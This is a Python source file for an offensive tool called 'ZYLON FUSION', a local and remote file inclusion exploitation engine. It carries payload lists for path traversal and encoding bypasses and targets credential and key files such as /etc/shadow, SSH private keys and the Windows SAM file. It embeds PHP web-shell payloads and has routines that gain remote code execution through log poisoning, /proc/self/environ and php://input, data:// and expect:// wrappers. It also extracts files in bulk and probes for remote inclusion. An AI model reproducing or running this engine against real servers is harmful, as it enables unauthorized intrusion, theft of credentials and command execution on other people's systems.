#!/usr/bin/env python3
"""
ZYLON FUSION - LFI/RFI Exploitation Engine
Fused from: LFITester + LFIHunt + LFIDump + PTScanner + PayloadsAllTheThings
Capabilities:
  - 12 LFI exploitation techniques (PHP wrappers, null byte, encoding, log poisoning, etc.)
  - Path traversal with deep bypass (8 encoding methods)
  - RFI callback testing with custom payload hosting
  - PHP filter wrapper for source code extraction
  - PHP input wrapper for code execution
  - Log poisoning (Apache/Nginx/SSH) for RCE
  - /proc/self/environ exploitation
  - Expect wrapper RCE
  - Data stream wrapper
  - Pharaoh wrapper bypass
  - Auto-detect OS from /etc/passwd or /etc/shadow
  - Recursive path traversal depth testing (1-8 levels)
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import os
import time
import base64
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.shared_infra import shared_session, regex_cache, oob_provider

# ============================================================================
# LFI/RFI PAYLOAD DATABASE (from PayloadsAllTheThings + LFITester + LFIHunt)
# ============================================================================

LFI_PATH_TRAVERSAL = [
    "../", "..\\", "..../", "....\\", "..%2f", "..%5c",
    "%2e%2e%2f", "%2e%2e%5c", "%2e%2e/", "..%252f",
    "..%c0%af", "..%c1%9c", "..%ef%bc%8f",
]

LFI_LINUX_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/resolv.conf", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
    "/etc/mysql/my.cnf", "/etc/php/php.ini", "/etc/php7/php.ini",
    "/etc/php8/php.ini", "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/var/log/auth.log", "/proc/self/environ", "/proc/self/cmdline",
    "/proc/self/fd/0", "/proc/version", "/proc/cpuinfo",
    "/proc/meminfo", "/etc/issue", "/etc/redhat-release",
    "/etc/debian_version", "/home/{user}/.bash_history", "/home/{user}/.ssh/id_rsa",
    "/root/.bash_history", "/root/.ssh/authorized_keys",
    "/var/log/mail.log", "/etc/crontab", "/etc/sudoers",
]

LFI_WINDOWS_FILES = [
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/Windows/win.ini", "C:/Windows/System32/config/SAM",
    "C:/boot.ini", "C:/inetpub/wwwroot/web.config",
    "C:/Users/Administrator/.ssh/id_rsa",
    "C:/ProgramData/mysql/my.ini",
]

PHP_WRAPPERS = {
    "filter_base64": "php://filter/convert.base64-encode/resource=",
    "filter_rot13": "php://filter/read=string.rot13/resource=",
    "filter_string_toupper": "php://filter/read=string.toupper/resource=",
    "filter_string_tolower": "php://filter/read=string.tolower/resource=",
    "filter_strip_tags": "php://filter/read=string.strip_tags/resource=",
    "input": "php://input",
    "data_plain": "data://text/plain,",
    "data_base64": "data://text/plain;base64,",
    "expect": "expect://",
    "phar": "phar://",
    "zip": "zip://",
    "pharaoh": "php://filter/read=convert.base64-encode/resource=",
}

NULL_BYTE_BYPASSES = [
    "%00", "%00.jpg", "%00.png", "%00.txt", "%00.html",
    "%00.php", "%00%00", "/%00",
]

ENCODING_BYPASSES = [
    "",  # no encoding
    "%2e%2e%2f",  # double-encode dots and slashes
    "..%252f",  # double-encode slash
    "%2e%2e/",  # encode dots only
    "..%c0%af",  # overlong UTF-8
    "..%c1%9c",  # overlong UTF-8 variant
    "..%ef%bc%8f",  # fullwidth slash
    "..%2f%2f",  # double slash
]

LOG_POISON_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/auth.log",
    "/var/log/sshd.log",
    "/var/log/mail.log",
    "/var/log/vsftpd.log",
]

LOG_POISON_PAYLOADS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php echo shell_exec($_GET["cmd"]); ?>',
    '<?php eval($_GET["cmd"]); ?>',
    '<?=`$_GET[cmd]`?>',
    '<?php passthru($_GET["cmd"]); ?>',
]


# ============================================================================
# LFI DETECTION SIGNATURES
# ============================================================================

LFI_SIGNATURES = {
    "linux_passwd": [
        r"root:x:0:0:", r"nobody:x:", r":/bin/(?:ba)?sh$",
        r":/home/", r":/usr/sbin/nologin",
    ],
    "linux_shadow": [
        r"root:\$6\$", r"root:\$5\$", r"root:\$1\$",
    ],
    "linux_hosts": [
        r"127\.0\.0\.1\s+localhost", r"::1\s+localhost",
    ],
    "windows_ini": [
        r"\[fonts\]", r"\[extensions\]", r"COM1\s*=",
    ],
    "php_info": [
        r"phpinfo\(\)", r"PHP Version", r"Configuration File",
    ],
    "config_file": [
        r"DB_PASSWORD", r"DB_USER", r"database_password",
        r"mysql_connect", r"mysqli_connect",
    ],
    "ssh_key": [
        r"BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY",
    ],
    "apache_conf": [
        r"ServerRoot", r"DocumentRoot", r"Listen\s+\d+",
    ],
    "nginx_conf": [
        r"worker_processes", r"server\s*\{", r"location\s+/",
    ],
}


class LFIEngine:
    """LFI/RFI Exploitation Engine - Fused from LFITester + LFIHunt + LFIDump + PTScanner"""

    def __init__(self, target_url=None, parameter=None, method="GET", data=None,
                 headers=None, cookies=None, proxy=None, timeout=10, threads=10):
        self.target_url = target_url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.session = shared_session
        self.findings = []
        self.injected_params = []

    def _send_request(self, url, method=None, data=None, headers=None):
        """Send HTTP request with error handling"""
        try:
            m = method or self.method
            d = data or self.data
            h = headers or self.headers
            if m == "GET":
                resp = self.session.get(url, params=d, headers=h,
                                       cookies=self.cookies, timeout=self.timeout)
            else:
                resp = self.session.post(url, data=d, headers=h,
                                        cookies=self.cookies, timeout=self.timeout)
            return resp
        except Exception:
            return None

    def _inject_payload(self, payload, param=None):
        """Inject payload into the target parameter"""
        p = param or self.parameter
        if not p:
            return None
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={urllib.parse.quote(payload)}"
        return self._send_request(url, method="GET")

    def _check_signature(self, content, file_type=None):
        """Check if response contains LFI signature"""
        text = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
        matches = []
        for sig_name, patterns in LFI_SIGNATURES.items():
            if file_type and sig_name != file_type:
                continue
            for pattern in patterns:
                if regex_cache.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                    matches.append(sig_name)
                    break
        return list(set(matches))

    def _build_traversal(self, depth, file_path, encoding=""):
        """Build path traversal payload with given depth and encoding"""
        traversal = encoding * depth if encoding else "../" * depth
        return traversal + file_path.lstrip("/")

    # ========================================================================
    # SCAN 1: LFI Detection (Multi-depth + Multi-encoding)
    # ========================================================================

    def detect_lfi(self):
        """Scan for LFI vulnerability using multiple techniques"""
        results = {
            "vulnerable": False,
            "parameter": self.parameter,
            "techniques_found": [],
            "files_read": [],
            "os_detected": None,
        }

        # Test basic LFI with /etc/passwd
        test_file = "/etc/passwd"
        for depth in range(1, 9):
            for encoding in ENCODING_BYPASSES:
                for null_byte in [NULL_BYTE_BYPASSES[0], ""]:  # with and without null byte
                    payload = self._build_traversal(depth, test_file, encoding)
                    payload += null_byte
                    resp = self._inject_payload(payload)
                    if resp and resp.status_code == 200:
                        sigs = self._check_signature(resp.text, "linux_passwd")
                        if sigs:
                            results["vulnerable"] = True
                            results["techniques_found"].append({
                                "depth": depth,
                                "encoding": encoding or "none",
                                "null_byte": bool(null_byte),
                                "payload": payload,
                                "signatures": sigs,
                            })
                            # Extract OS info from passwd
                            try:
                                users = [l.split(":")[0] for l in resp.text.strip().split("\n") if ":" in l]
                                results["os_detected"] = "Linux"
                                results["files_read"].append({
                                    "file": test_file,
                                    "users": users[:10],
                                })
                            except Exception:
                                pass
                            return results  # Found LFI, no need to test more

        # Test Windows targets
        for depth in range(1, 9):
            for win_file in ["C:/Windows/win.ini", "C:/Windows/System32/drivers/etc/hosts"]:
                payload = self._build_traversal(depth, win_file, "")
                resp = self._inject_payload(payload)
                if resp:
                    sigs = self._check_signature(resp.text, "windows_ini")
                    if sigs:
                        results["vulnerable"] = True
                        results["os_detected"] = "Windows"
                        results["techniques_found"].append({
                            "depth": depth, "encoding": "none",
                            "payload": payload, "signatures": sigs,
                        })
                        return results

        return results

    # ========================================================================
    # SCAN 2: PHP Wrapper Exploitation
    # ========================================================================

    def php_wrapper_exploit(self, file_path="/etc/passwd"):
        """Exploit LFI using PHP wrappers"""
        results = {
            "vulnerable": False,
            "wrappers_working": [],
            "extracted_data": {},
        }

        # Test filter:// wrapper for source code extraction
        for wrapper_name, wrapper_prefix in PHP_WRAPPERS.items():
            if wrapper_name in ["input", "data_plain", "data_base64", "expect"]:
                continue  # These are tested separately

            payload = f"{wrapper_prefix}{file_path}"
            resp = self._inject_payload(payload)
            if resp and resp.status_code == 200:
                content = resp.text
                # Try base64 decode if it looks encoded
                if wrapper_name in ["filter_base64", "pharaoh"]:
                    try:
                        # Extract base64 content from response
                        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', content)
                        if b64_match:
                            decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                            results["wrappers_working"].append({
                                "wrapper": wrapper_name,
                                "decoded_length": len(decoded),
                                "preview": decoded[:200],
                            })
                            results["extracted_data"][file_path] = decoded
                            results["vulnerable"] = True
                            continue
                    except Exception:
                        pass

                # Check for valid content signatures
                sigs = self._check_signature(content)
                if sigs or len(content) > 50:
                    results["wrappers_working"].append({
                        "wrapper": wrapper_name,
                        "signatures": sigs,
                        "content_length": len(content),
                    })
                    results["extracted_data"][file_path] = content
                    results["vulnerable"] = True

        return results

    # ========================================================================
    # SCAN 3: PHP Input + Data Wrapper RCE
    # ========================================================================

    def php_rce_exploit(self, command="id"):
        """Exploit LFI to get RCE via php://input and data:// wrappers"""
        results = {
            "rce_achieved": False,
            "rce_methods": [],
            "command_output": None,
        }

        # Test php://input with POST
        php_payload = f"<?php system('{command}'); ?>"
        url = self.target_url
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{self.parameter}=php://input"
        resp = self._send_request(url, method="POST", data=php_payload)
        if resp and resp.status_code == 200:
            # Check if command output is present
            if "uid=" in resp.text or "gid=" in resp.text:
                results["rce_achieved"] = True
                results["rce_methods"].append("php://input")
                results["command_output"] = resp.text.strip()
            elif len(resp.text) > 0 and "error" not in resp.text.lower():
                results["rce_achieved"] = True
                results["rce_methods"].append("php://input")
                results["command_output"] = resp.text.strip()

        # Test data:// wrapper
        b64_cmd = base64.b64encode(f"<?php system('{command}'); ?>".encode()).decode()
        payload = f"data://text/plain;base64,{b64_cmd}"
        resp = self._inject_payload(payload)
        if resp and resp.status_code == 200:
            if "uid=" in resp.text or "gid=" in resp.text:
                results["rce_achieved"] = True
                results["rce_methods"].append("data://base64")
                results["command_output"] = resp.text.strip()

        # Test expect:// wrapper
        payload = f"expect://{command}"
        resp = self._inject_payload(payload)
        if resp and resp.status_code == 200:
            if len(resp.text) > 0 and "error" not in resp.text.lower()[:100]:
                results["rce_achieved"] = True
                results["rce_methods"].append("expect://")

        return results

    # ========================================================================
    # SCAN 4: Log Poisoning RCE
    # ========================================================================

    def log_poisoning_exploit(self, command="id"):
        """Exploit LFI via log poisoning for RCE"""
        results = {
            "rce_achieved": False,
            "poisoned_logs": [],
            "command_output": None,
        }

        for log_path in LOG_POISON_PATHS:
            # Step 1: Poison the log by sending malicious User-Agent
            for poison_payload in LOG_POISON_PAYLOADS:
                poisoned_headers = self.headers.copy()
                poisoned_headers['User-Agent'] = poison_payload
                try:
                    self.session.get(self.target_url, headers=poisoned_headers,
                                    timeout=self.timeout)
                except Exception:
                    continue

            # Step 2: Access the log file via LFI with command parameter
            for depth in range(1, 7):
                payload = self._build_traversal(depth, log_path, "")
                sep = "&" if "?" in self.target_url else "?"
                url = f"{self.target_url}{sep}{self.parameter}={urllib.parse.quote(payload)}&cmd={command}"
                resp = self._send_request(url, method="GET")
                if resp and resp.status_code == 200:
                    # Check if command output is in response
                    cmd_patterns = [r"uid=\d+", r"gid=\d+", r"total \d+", r"Volume"]
                    for pattern in cmd_patterns:
                        match = regex_cache.search(pattern, resp.text)
                        if match:
                            results["rce_achieved"] = True
                            results["poisoned_logs"].append({
                                "log_path": log_path,
                                "depth": depth,
                                "command": command,
                            })
                            results["command_output"] = resp.text.strip()[:500]
                            return results

        return results

    # ========================================================================
    # SCAN 5: /proc/self/environ RCE
    # ========================================================================

    def proc_environ_exploit(self, command="id"):
        """Exploit LFI via /proc/self/environ"""
        results = {
            "rce_achieved": False,
            "environ_leaked": False,
            "command_output": None,
            "env_vars": [],
        }

        for depth in range(1, 7):
            payload = self._build_traversal(depth, "/proc/self/environ", "")
            resp = self._inject_payload(payload)
            if resp and resp.status_code == 200:
                # Check for environment variables
                env_matches = regex_cache.findall(r'(\w+)=([^\x00\n]+)', resp.text)
                if env_matches and len(env_matches) > 3:
                    results["environ_leaked"] = True
                    results["env_vars"] = [(k, v[:50]) for k, v in env_matches[:20]]

                    # Try poisoning User-Agent for RCE
                    poison_ua = f"<?php system('{command}'); ?>"
                    poisoned_headers = self.headers.copy()
                    poisoned_headers['User-Agent'] = poison_ua
                    try:
                        self.session.get(self.target_url, headers=poisoned_headers,
                                        timeout=self.timeout)
                    except Exception:
                        pass

                    # Re-access environ with cmd
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{self.parameter}={urllib.parse.quote(payload)}&cmd={command}"
                    resp2 = self._send_request(url, method="GET")
                    if resp2 and ("uid=" in resp2.text or "gid=" in resp2.text):
                        results["rce_achieved"] = True
                        results["command_output"] = resp2.text.strip()[:500]

                    return results

        return results

    # ========================================================================
    # SCAN 6: Full File Extraction
    # ========================================================================

    def extract_files(self, file_list=None, depth=4):
        """Extract multiple files via LFI"""
        files_to_read = file_list or LFI_LINUX_FILES[:15]
        results = {
            "files_extracted": [],
            "total_tested": len(files_to_read),
        }

        for file_path in files_to_read:
            for encoding in ["", "%2e%2e%2f"]:
                payload = self._build_traversal(depth, file_path, encoding)
                resp = self._inject_payload(payload)
                if resp and resp.status_code == 200:
                    sigs = self._check_signature(resp.text)
                    if sigs or len(resp.text.strip()) > 30:
                        results["files_extracted"].append({
                            "file": file_path,
                            "size": len(resp.text),
                            "signatures": sigs,
                            "preview": resp.text[:300],
                        })
                        break  # Found with this file, move on

        return results

    # ========================================================================
    # SCAN 7: RFI Testing
    # ========================================================================

    def detect_rfi(self, callback_url=None):
        """Test for Remote File Inclusion"""
        results = {
            "vulnerable": False,
            "payloads_tested": [],
            "callback_received": False,
        }

        # Use OOB provider for dynamic callback instead of hardcoded localhost
        oob_provider.initialize()
        payload_id = oob_provider.generate_payload_id()
        callback_url = callback_url or oob_provider.get_callback_url(payload_id)

        rfi_payloads = [
            callback_url,
            f"{callback_url}%00",
            f"{callback_url}?%00",
            f"{callback_url}%",
        ]

        for payload in rfi_payloads:
            resp = self._inject_payload(payload)
            results["payloads_tested"].append({
                "payload": payload,
                "status": resp.status_code if resp else "error",
            })

        # Poll OOB provider for callback interactions
        interactions = oob_provider.check_interactions(payload_id)
        if interactions:
            results["callback_received"] = True
            results["vulnerable"] = True
            results["oob_interactions"] = interactions

        return results

    # ========================================================================
    # SCAN 8: Multi-Parameter LFI Scanner
    # ========================================================================

    def scan_all_parameters(self):
        """Auto-discover and test all parameters for LFI"""
        results = {
            "parameters_found": 0,
            "vulnerable_params": [],
        }

        # Extract parameters from URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        if params:
            results["parameters_found"] = len(params)
            for param_name in params:
                old_param = self.parameter
                self.parameter = param_name
                lfi_result = self.detect_lfi()
                if lfi_result["vulnerable"]:
                    results["vulnerable_params"].append({
                        "parameter": param_name,
                        "details": lfi_result,
                    })
                self.parameter = old_param
        else:
            # Common parameter names to test
            common_params = [
                "file", "path", "page", "doc", "include", "template",
                "view", "content", "document", "folder", "dir",
                "show", "read", "load", "img", "image", "lang",
                "style", "pdf", "action", "module", "catalog",
            ]
            results["parameters_found"] = len(common_params)
            for param in common_params:
                old_param = self.parameter
                self.parameter = param
                # Quick test only
                payload = "../../../../../../etc/passwd"
                resp = self._inject_payload(payload)
                if resp and resp.status_code == 200:
                    sigs = self._check_signature(resp.text, "linux_passwd")
                    if sigs:
                        results["vulnerable_params"].append({
                            "parameter": param,
                            "vulnerable": True,
                        })
                self.parameter = old_param

        return results


# ============================================================================
# CONVENIENCE RUNNER FUNCTIONS
# ============================================================================

def run_lfi_scan(target, parameter="file", scan_type="detect", **kwargs):
    """Run LFI scan with specified type"""
    engine = LFIEngine(target_url=target, parameter=parameter, **kwargs)

    scan_methods = {
        "detect": engine.detect_lfi,
        "php_wrapper": engine.php_wrapper_exploit,
        "rce": engine.php_rce_exploit,
        "log_poison": engine.log_poisoning_exploit,
        "proc_environ": engine.proc_environ_exploit,
        "extract": engine.extract_files,
        "rfi": engine.detect_rfi,
        "multi_param": engine.scan_all_parameters,
    }

    if scan_type in scan_methods:
        return scan_methods[scan_type]()
    return {"error": f"Unknown scan type: {scan_type}"}
